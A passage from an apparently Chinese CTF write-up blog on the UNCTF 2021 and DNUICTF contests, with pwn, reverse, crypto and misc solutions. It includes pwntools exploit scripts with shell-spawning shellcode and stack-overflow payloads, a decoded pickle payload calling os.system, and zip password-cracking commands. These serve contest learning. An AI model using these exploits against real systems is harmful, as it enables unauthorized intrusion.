read_shell_code(); puts(&quot;Have you finished?&quot;); read(0, buf, 0x20uLL); puts(&quot;~Bye&quot;); return 0;&#125;ssize_t read_shell_code()&#123; return read(0, &amp;buf, 0x5AuLL);&#125; read_shell_code() 将输入的shellcode写入bss段 buf 区域，再通过 read() 实现ret2shellcode。 Payload： 12345678910111213141516171819202122from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,34717)context.arch = &#x27;amd64&#x27;r.recvuntil(&#x27;show me your Migic\\n&#x27;)shellcode = asm(&#x27;&#x27;&#x27;mov rbx,0x68732f6e69622fpush rbxmov rdi,rspxor rsi,rsixor rdx,rdxmov rax,0x3bsyscall&#x27;&#x27;&#x27;)print(shellcode)r.send(shellcode)r.recvline()bss_addr = 0x601080pl = &#x27;a&#x27;*(0x10+8)+p64(0x601080)r.send(pl)r.interactive() ​ magic_int关键代码： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); __isoc99_scanf(&amp;unk_400959, &amp;v4); if ( v4 &lt; 0 ) &#123; v4 = -v4; if ( v4 &lt; 0 ) EDG(); &#125; return 0;&#125;__int64 EDG()&#123; char v1[112]; // [rsp+0h] [rbp-70h] BYREF puts(s); return gets(v1);&#125; c中int取值范围为 -2147483648 ~ +2147483647，而 -2147483648 刚好为取反发生上溢的数，传入即可进入 EDG()，再ret2text。 Payload： 123456789101112from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,38780)backdoor = 0x400781r.send(&#x27;-2147483648\\x00&#x27;)p.recv()pay = &#x27;a&#x27; * 0x77 + p64(backdoor)r.send(pay)r.interactive() ​ magic_abs关键代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned int v5; // [rsp+Ch] [rbp-84h] BYREF char s[92]; // [rsp+10h] [rbp-80h] BYREF int v7; // [rsp+6Ch] [rbp-24h] BYREF time_t timer; // [rsp+70h] [rbp-20h] BYREF __int64 v9; // [rsp+78h] [rbp-18h] unsigned int v10; // [rsp+80h] [rbp-10h] int v11; // [rsp+84h] [rbp-Ch] unsigned int v12; // [rsp+88h] [rbp-8h] unsigned int v13; // [rsp+8Ch] [rbp-4h] init(argc, argv, envp); v3 = time(&amp;timer); srand(v3); memset(s, 0, 0x50uLL); puts(&quot;What&#x27;s your name?&quot;); v11 = read(0, s, 0x50uLL); puts(&quot;Tell me your a g e:&quot;); fflush(stdout); __isoc99_scanf(&quot;%d&quot;, &amp;v7); puts(&quot;What&#x27;s your lucky number?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v5); v10 = abs32(v5); v9 = (int)(v10 + v11); v12 = 1; if ( v9 &gt;= 0 ) &#123; s[10] = 0; printf(&quot;Hi,%s And see you next time!\\n&quot;, s); v12 = 0; &#125; puts(&quot;Recording...&quot;); if ( v12 ) v13 = rand() % (((int)abs32(v5 + v7) &gt;&gt; v7) + 1); else v13 = rand() % 10000; record(s, v5, v13, v12); return 0;&#125;void *__fastcall record(const char *a1, unsigned int a2, unsigned int a3, int a4)&#123; size_t v4; // rax char dest[16]; // [rsp+20h] [rbp-10h] BYREF printf(&quot;\\n name: %s \\n lucky number: %d \\n tag: %d\\n DOWN!\\n&quot;, a1, a2, a3); v4 = strlen(a1); if ( a4 ) return memcpy(&amp;dest[a3], a1, v4); else return memcpy(dest, a1, v4);&#125; 构造 v7 和 v5，使得 (((int)abs32(v5 + v7) &gt;&gt; v7) + 1) 为1，v13 不再随机只能取0，在 record() 中，输入的 s 作为payload复制到 dest 区域，造成栈溢出。 本地测试： 123456789#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;stdlib.h&gt;int main() &#123; unsigned int v5 = -2147483647; printf(&quot;%d\\n&quot;,(int)v5); //-2147483647 int v7 = 2147483647; printf(&quot;%d\\n&quot;,((int)(v5+v7))&gt;&gt;v7); //0&#125; Payload： 12345678910111213from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,36236)print(r.recvline())backdoor_addr = 0x4009D7pl = &#x27;a&#x27;*(0x10+8)+p64(backdoor_addr)r.send(pl)print(r.recvline())r.sendline(&#x27;2147483647&#x27;)print(r.recvline())r.sendline(&#x27;-2147483647&#x27;)r.interactive() ​ # Reverseezlogin 程序流程识别，算法逆向 login() 中 pqsd`fl&#123;zmpZsag&#125;wdYVkUNC 与 0x16 异或得到 fgervpzml&#123;fLewqkarO@&#125;CXU，再8位一组上下排列，从上往下取出连成：flag&#123;refOrL@ve&#125;pwCzqXmkU。 flag：flag&#123;refOrL@ve&#125; ​ rejunk 垃圾代码混淆，异或算法逆向 查看伪代码发现夹进很多垃圾代码，跟进几行有用的代码： 123456__main();puts(&quot;input your answer:&quot;);scanf(&quot;%s&quot;, v14);sprintf(Buffer, &quot;%s%s%s%s&quot;, &quot;WQGUL&quot;, &quot;xb&gt;2:&quot;, &quot;ooh95=&quot;, &quot;&#x27;&#x27;twk&quot;);if ( (v9 ^ (v14[v9] + 2)) != Buffer[v9] ) break; 脚本逆解： 1234567s = list(b&#x27;&#x27;&#x27;WQGULxb&gt;2:ooh95=&#x27;&#x27;twk&#x27;&#x27;&#x27;)t = []for i in range(len(s)): t.append((s[i]^i)-2)print(bytes(t))# b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27; flag：UNCTF&#123;b781cbb29054db&#125; ​ py_trade EZ opcode! Give me your PY, and i’ll give you flag! 还原python字节码： 123456789flag = &#x27;XXXXXX&#x27;num = [0]*18k = 0for i in range(len(flag)): num[i] = (ord(flag[i])+i)^(k%3+1) num[len(flag)-i-1] = (ord(flag[len(flag)-i-1])+len(flag)-i-1)^(k%3+1) k += 1print(num)#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49] 用z3解： 12345678910111213141516171819from z3 import *s = Solver()num = [115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]flag = [BitVec(&#x27;flag%d&#x27;%i,8) for i in range(len(num))]res = [-1]*len(num)k = 0for i in range(len(num)): res[i] = (flag[i]+i)^(k%3+1) res[len(flag)-i-1] = (flag[len(flag)-i-1]+len(flag)-i-1)^(k%3+1) k += 1for i in range(len(num)): s.add(res[i]==num[i])if s.check() == sat: m = s.model() print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag)) # py_Trad3_1s_fuNny! flag：unctf&#123;py_Trad3_1s_fuNny!&#125; ​ ezDriver 你了解过驱动嘛？试试看吧！ 分析逻辑，DriverEntry() -&gt; sub_140086000() -&gt; sub_140085268() -&gt; sub_140085000() -&gt; sub_140085020()。 主程序逻辑在 sub_140085020()： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall sub_140085020(volatile void *Address, __int64 a2)&#123; int v4; // ecx __int64 v5; // rax unsigned __int64 v6; // r8 int v8; // ecx __int64 v9; // [rsp+20h] [rbp-828h] char v10[2048]; // [rsp+30h] [rbp-818h] BYREF sub_140001640(v10, 0i64, 2048i64); ProbeForRead(Address, 0x800ui64, 1u); DbgPrintEx(0x4Du, 3u, &quot;[+] UserBuffer: 0x%p\\n&quot;, (const void *)Address); DbgPrintEx(0x4Du, 3u, &quot;[+] UserBuffer Size: 0x%zX\\n&quot;, a2); DbgPrintEx(0x4Du, 3u, &quot;[+] KernelBuffer: 0x%p\\n&quot;, v10); DbgPrintEx(0x4Du, 3u, &quot;[+] KernelBuffer Size: 0x%zX\\n&quot;, 0x800ui64); v4 = 0; LODWORD(v9) = 0; while ( (unsigned __int64)v4 &lt; 0x200 ) &#123; byte_140083090[v4] = v10[4 * v4]; LODWORD(v9) = ++v4; &#125; sub_140001000(byte_140083090, (unsigned int)dword_140003028, &amp;unk_140003030);// XXTEA加密 v5 = -1i64; v6 = -1i64; do ++v6; while ( byte_140003000[v6] ); do ++v5; while ( byte_140083090[v5] ); if ( v5 == v6 ) &#123; v8 = 0; HIDWORD(v9) = 0; while ( v8 &lt; v6 ) &#123; if ( byte_140003000[v8] != byte_140083090[v8] )// 比较 &#123; DbgPrintEx(0x4Du, 3u, &quot;[*] flag wrong!&quot;, byte_140003000, v9); return 0i64; &#125; HIDWORD(v9) = ++v8; &#125; DbgPrintEx(0x4Du, 3u, &quot;[*] you are right@&quot;, byte_140003000, v9); DbgPrintEx(0x4Du, 3u, &quot;[+] Triggering Buffer Overflow in Stack\\n&quot;); sub_140001380(v10, Address, a2); return 0i64; &#125; else &#123; DbgPrintEx(0x4Du, 3u, &quot;[*] flag Wrong!&quot;, byte_140003000, v9); return 0i64; &#125;&#125; 发现通过加密函数 sub_140001000() 后，得到的结果 byte_140083090 与 byte_140003000 作比较。 跟进加密函数 sub_140001000()，由特征知为XXTEA加密算法，使用的key为 unk_140003030=[1,2,3,4]。 脚本解密： 1234567891011121314151617181920212223242526272829303132def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: key = [1, 2, 3, 4] s = &#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27; s = [s[8*k:8*k+8] for k in range(len(s)//8)] s = [bytes.fromhex(k)[::-1].hex() for k in s] encrypted = [int(k,16) for k in s] decrypted = decrypt(encrypted, key) decrypted = [hex(k)[2:] for k in decrypted][:-1] flag = [bytes.fromhex(k)[::-1] for k in decrypted] print(b&#x27;&#x27;.join(flag))# b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27; flag：unctf&#123;Do_you_want_to_a_cup_of_tea?&#125; ​ # Cryptoeasy_rsa 简单的RSA 1234q= 9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471p= 12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101c= 28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225e = 65537 RSA基操。 1234567891011q = 9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471p = 12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101c = 28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225e = 65537import gmpy2fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27; ​ 探秘中世纪城堡 贝拉在参观一个中世纪的古堡时，在桌上看到了一串一奇怪的字符和描述。你能帮大聪明破解皇珈骑士留下来的谜团吗？ 年轻的大帝率领着64位皇珈骑士冲破了双重阻栏夺下了城池。AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259 ROT21+base64+栅栏2。 flag：UNCTF&#123;subscribe_to_Xiangwandamowang&#125; ​ 分析badusb流量 一日，某企业的安全管理员发现企业中的电脑遭到了badusb的侵害，以下他分离出来的有问题USB流量，而这似乎跟键盘的键位映射有关。 2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030 键盘键位映射规则，映射关系参考《USB键盘协议中键码》中的HID Usage ID。 前两位20代表大写，10代表小写，后两位为键码，对照写flag。 flag：UNCTF&#123;Y0u-Are-very-n1ce&#125; ​ baby_rsa 123456789101112131415161718import gmpy2import libnumimport randomimport uuidflag=&quot;unctf&#123;&quot;+str(uuid.uuid4())+&quot;&#125;&quot;m=libnum.s2n(flag)p=libnum.generate_prime(1024)q=libnum.generate_prime(1024)n=p*qe=65537c=pow(m*p+n,e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)print(&quot;e=&quot;,e)#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059#e= 65537 $c = (mp+n)^e \\% n = p^e(m+q)^e \\% n $， 有 $c\\%p = p^e(m+q)^e \\% p = \\Big((p^e \\% p)\\big((m+q)^e \\% p\\big)\\Big) \\% p=0$， 故 $c=kp$，又 $n=pq$，则 $p=\\gcd(c,n)$。 求出 $d \\equiv e^{-1} \\pmod {\\varphi(n)}$，可以得到 $m’ = mp+n = c^d \\% n$，所以 $m = \\cfrac{m’-n}{p}$。 123456789101112n = 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141c = 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059e = 65537p = gcd(n,c)q = n//pimport gmpy2fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = int(pow(c,d,n)-n)//pprint(bytes.fromhex(hex(m)[2:]))# b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27; flag：unctf&#123;rsa_s1mp1e_0kk&#125; ​ 电信诈骗pro 朕是秦始皇，其实朕没有死，朕在西安兵马俑第四个坑第七排，朕是吃了长生不老药的，朕告诉你啊，朕在陕西有3000吨黄金和300万秦兵被封印，现在只需要30元就能解封，只要你打钱给朕，朕明天直接带部队复活，让你统领三军!建立像古罗马一样的帝国，君无戏言！ 朕的账户是5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7= flag格式为unctf{} 尝试异或爆破，发现异或0x40有 unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;，说明中间加密方式不同。 提取中间部分尝试出是ROT47+凯撒17： 123456789s=&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\\gWIf&#x27;for i in range(-200,200): t=&#x27;&#x27; for j in range(len(s)): if ord(s[j])+i &gt;=32 and ord(s[j])+i&lt;127: t+=chr(ord(s[j])+i) if len(t)==len(s): print(i,t) 其中 5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw base64解码是 别解了，那个就是flag。 flag：unctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125; ​ # Misc简单日志审计 相传，在某一归隐门派的服务器里存在着众多盖世绝学，谁掌握了任一一本绝学谁就能一统CTF江湖，突然有一天门派的长老发现服务器的日志里存在着些许异常，或许这门绝学已经失窃了，请帮帮长老找出失窃的是哪一本绝学吧。flag格式为UNCTF{*} 日志文件里找到base64编码字符串 STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu， 解码得pickle： 1234567891011121314151617I0p00S&#x27;cat /CTF?YouShouJiuXing&#x27;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR. flag：UNCTF&#123;CTF?YouShouJiuXing&#125; ​ 电信诈骗 CTFer,你好，我是威震天！其实我在芝加哥大战中没死，现在你只需要打2000RMB到我的银行账户，我就可以用这2000RMB发红包骗取人们的信任，然后穿过股市网络找到震荡波在纽约给我找的新身体，然后我就可以复活了。今天如果你帮了我，复活后我可以入侵股市网络把钱全部给你们。等过了周末，我就让红蜘蛛变成飞机去接你，然后我把红蜘蛛杀了，让你当霸天虎副指挥官，然后我们从南极洲呈扩散式发出霸天虎军队，万军齐发，占领地球，怎么样？为了防止这条消息被擎天柱拦截。我将银行卡号进行了加密，希望你能成功解密。我的银行账户是 qi]m^roVibdVbXUU`h flag格式：unctf{} 变异凯撒加密，脚本爆破： 123456789s=&#x27;qi]m^roVibdVbXUU`h&#x27;for i in range(-200,200): t=&#x27;&#x27; for j in range(len(s)): if ord(s[j])+i+j &gt;=32 and ord(s[j])+i+j&lt;127: t+=chr(ord(s[j])+i+j) if len(t)==len(s): print(t) flag：unctf&#123;yauoreright&#125; ​ 引大流咯，happy 虚掩的大门后是一副残缺的画卷。 修改jpg高度发现flag。 flag：UNCTF&#123;BellalaBella&#125; ​ 倒立洗头观察文件字符串头尾分别是 d9ff 和 ffd8，脚本逆序处理： 12f = open(&#x27;key.txt&#x27;,&#x27;r&#x27;).read()open(&#x27;key.jpg&#x27;,&#x27;wb&#x27;).write(bytes.fromhex(f)[::-1]) 把文件头 D8FF 修正为 FFD8，图片没什么异常，在中间发现字符串： 5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg== 解码： 佛日：上俱故。遠大密隸怯除多皤孕耨爍梵地諳薩侄究缽老諳不想皤者滅罰輸缽阿侄滅梵夢侄不冥吉真梵沙缽度即缽隸怯明侄切侄知呐地南呼舍咒奢佛涅哆姪神密明哆逝室地恐冥呼怯佛喝哆伽都怯遮諳倒缽帝冥帝輸曰諳麼俱怖俱苦俱波 把 日 改为 曰，佛曰解密得flag。 flag：unctf&#123;it_is_easy_right?&#125; ​ LPLpng图片用010 editor查看，第9-15个块CRC值错误，提取Hex值 4544476e622121，解Hex得 EDGnb!!。 以此为密码解压缩包，flag.txt 提示 https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0，以及一个 2021/11/24 14:11 的时间，访问B站视频在评论区找到 2021/11/24 14:11 的评论见flag。 flag：flag&#123;LpL_zgbr_rNg_eDg777&#125; ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"第一届东软杯网络CTF竞赛-DNUICTF","slug":"match-第一届东软杯网络CTF竞赛DNUICTF","date":"2021-12-05T12:40:24.000Z","updated":"2021-12-05T17:56:56.779Z","comments":true,"path":"2021/12/05/match-第一届东软杯网络CTF竞赛DNUICTF/","link":"","permalink":"https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/","excerpt":"","text":"​ 由大连市公安局作为指导单位，大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持的“暗泉杯”网络安全竞赛将于2021年12月份举行。该竞赛是运用信息安全知识的一次创新性竞赛活动，希望通过这次比赛增强我校学生的安全知识运用能力和经验积累。本次比赛也面向校外开放注册通道，旨在为信息安全领域爱好者提供一个交流和水平展示的舞台。 本次竞赛采用线上CTF（Capture The Flag，夺旗赛）赛制。选手充分运用自身掌握的各方面的知识与技能，设法解开题目，获得题目中的“Flag”并提交，得到分数，最终根据分数排名。内容涉及Reverse(逆向分析)，Web(Web漏洞利用)，PWN（溢出类），Crypto(密码学)，Misc(混合杂项题)等方面。 竞赛时间 2021年12月4日 10：00—2021年12月5日22：00（36个小时） 报名平台链接：http://ctf.neusoft.edu.cn/ Rank: 9 MISC[签到]签到 除特别说明外本次比赛flag的格式统一为 flag{字符串} 比如下面这个就是一个典型的flag flag{Dnui_ctf_2021_s1gn_in} 将上面的flag提交即可完成答题 另外本次CTF比赛会根据整体解题情况分批次放出题目 (解不出题时 可以等待下一波新题目放出继续作答) 请加入QQ群 630995618 或查看平台公告 关注题目动态 flag&#123;Dnui_ctf_2021_s1gn_in&#125;。 ​ [萌新]在哪呢 FLAG在哪呢 pdf内容全选复制，打开任一文本编辑器粘贴，发现flag：flag&#123;hey_there_is_no_thing&#125;。 ​ 只是个PNG，别想太多了.pngbinwalk命令查看png图片：binwalk -e PNG.png，分解出最后一个zlib块，发现flag：flag&#123;zhe_ti_mu_ye_tai_bt_le_XD&#125;。 ​ 压缩包压缩包压缩包压缩包zip压缩包套娃，每一层的密码是文件名，python脚本解套： 12345678910111213141516171819202122232425import zipfile import osnow = &quot;yasuobao.zip&quot;while 1: print(&quot;START &quot;+now) zfile = zipfile.ZipFile(now) password = zfile.namelist()[0].split(&#x27;.&#x27;)[0] try: zfile.extractall(members=zfile.namelist(), pwd=password.encode(&#x27;utf-8&#x27;)) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break except: break print(&#x27;END &#x27;+now) 最后解压得到 23333.zip，打开发现注释提示密码6位数，ARCHPR爆破得756698，解压得flag：flag&#123;Unz1p_i5_So_C00l##&#125;。 ​ easystegpng图片，二维码用微信扫出内容 某种常见的隐写，用010editor 16进制查看，发现尾部有zip压缩包，提取出来，解压出 _find.png。 尝试高低位隐写、盲水印等无结果，考虑stegpy： stegpy _find.png 得到flag：flag&#123;Do_U_Kn0w_Ste9py??&#125;。 ​ range_download Hint: filter: dns Wireshark打开流量包文件，观察到有很多返回1字节的流，且请求中都带 xxx-xxx/2460 字符串，猜测为文件 flag.7z 的单字节断点下载 ，根据请求与响应特征，用脚本提取出所有1字节，并按相应位置填入数组，以字节形式写入文件。发现缺少第2349位字节，按照0x00-0xff分别填入，生成256个7z文件： 12345678910111213141516171819202122232425import ref = open(&#x27;range.pcapng&#x27;,&#x27;rb&#x27;).read()x1 = b&#x27;\\x0d\\x0aContent-Range: bytes &#x27;l1 = len(x1)pos1 = [i.start() for i in re.finditer(x1, f)]x2 = b&#x27;\\x0d\\x0aContent-Type: application/x-7z-compressed\\x0d\\x0a\\x0d\\x0a&#x27;l2 = len(x2)pos2 = [i.start() for i in re.finditer(x2, f)][1:]realpos = [int(f[k+l1:k+l1+10][:f[k+l1:k+l1+10].index(b&#x27;-&#x27;)]) for k in pos1]realval = [f[k+l2:k+l2+10][0] for k in pos2]out = [-1]*2460for i in range(len(pos1)): out[realpos[i]]=realval[i]print(out.index(-1))print(type(out[0]))for i in range(256): out[2349]=i outbyte = bytes(out) open(f&#x27;xxx/flag&#123;i&#125;.7z&#x27;,&#x27;wb&#x27;).write(outbyte) 生成的7z文件都加密，爆破无果。 后面放出提示 filter: dns，重新Wireshark打开流量包，过滤dns流量，发现域名 .nss.neusoft.edu.cn 前的主机名可以组成一串base64编码 cGFzc3dvcmQ6IG5zc195eWRzIQ==，解码有 password: nss_yyds!。 使用脚本批量尝试解压256个7z压缩包： 123456789101112131415161718192021222324252627import py7zrimport osdef uncompress(path_name): if py7zr.is_7zfile(path_name): try: d_name = &#x27;nss_yyds!&#x27; with py7zr.SevenZipFile(path_name,password=d_name, mode=&#x27;r&#x27;) as sevenZ_f: sevenZ_f.extractall(path_name.rsplit(&quot;.7z&quot;)[0]) except Exception as e: print(&#x27;Error when uncompress file! info: &#x27;, e) return False else: return True else: print(&#x27;This is not a true 7z file!&#x27;) return False if __name__ == &#x27;__main__&#x27;: folder_name = &#x27;xxx&#x27; os.chdir(folder_name) files = os.listdir(folder_name) for f in files: f_path = folder_name + os.sep + f if os.path.isfile(f_path): print(&quot;解压--&quot;+f) uncompress(path_name=f_path) 运行完成发现 flag194.7z 解压成功，得到一张二维码， 扫描得到的内容，经hex+base64+base62+base58+base32 解码得flag：flag&#123;6095B134-5437-4B21-BE52-EDC46A276297&#125;。 ​ ecryptedzip只提供了一个带 README.md 和 LICENSE 两个文件的加密zip压缩包，用ARCHPR弱密码及字典都无法得到密码。 想到这两个文件经常默认出现在Github库中，随便找一个Github库，下载LICENSE文件，发现大小与压缩包内的LICENSE文件相近，可以采用已知部分明文（至少连续12字节）攻击方式破解。保留下载的LICENSE文件中前几行内容，用rbkcrack工具跑key： rbkcrack.exe -C ecryptedzip.zip -c LICENSE -p LICENSE.txt 拿到三组key之后进行解密： rbkcrack.exe -C ecryptedzip.zip -c README.md -k 32cc3495 7f955ff5 58291af3 -d README.md 或直接将key输入ARCHPR的明文攻击模式里的key输入框中，成功解压zip包。 flag：flag&#123;Kn0wn_pla1ntext_attack_Is_very_Usefully&#125;。 ​ CRYPTO[签到]键盘侠 UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN flag{} 提交时括号内为大写字母 键盘密码，按字母顺序在键位比划：flag&#123;CLCKOUTHK&#125;。 ​ [萌新]素数 目前768位的素数选择下，rsa等公钥加密算法已经不安全，rsa加密需要进行更大素数的选择，请您选出10个1024位以上的大素数提交给我 http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/ 备用 http://sushu_5rg35rg4g.nssctf.neusoft.edu.cn/ 页面输入10个1024位以上的素数提交拿flag。生成1025位的素数： 1234from Crypto.Util.number import *for i in range(10): print(getPrime(1025)) flag：flag&#123;d6a6a1bc-88e9-4330-83f9-bdd3bdad5401&#125;。 ​ silent_peeper You are just a silent peeper, silently discovering the secret. 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from Crypto.Cipher import AESimport binasciiflag = &quot;flag&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;bs = AES.block_sizepad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)p = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977a = getRandomNBitInteger(40)b = getRandomNBitInteger(40)A = pow(g, a, p)B = pow(g, b, p)assert pow(A, b, p) == pow(B, a, p)key = pow(A, b ,p)key = long_to_bytes(key)[:16]cipher = AES.new(key, AES.MODE_ECB)ciphertext = cipher.encrypt(pad(flag))with open(&#x27;cipher&#x27;, &#x27;w&#x27;) as f: f.write(&quot;A, B = &#123;&#125;\\n&quot;.format(str((A, B)))) f.write(&quot;ciphertext = &#123;&#125;\\n&quot;.format(binascii.hexlify(ciphertext))) f.close()# cipher# A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016L, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544L)# ciphertext = 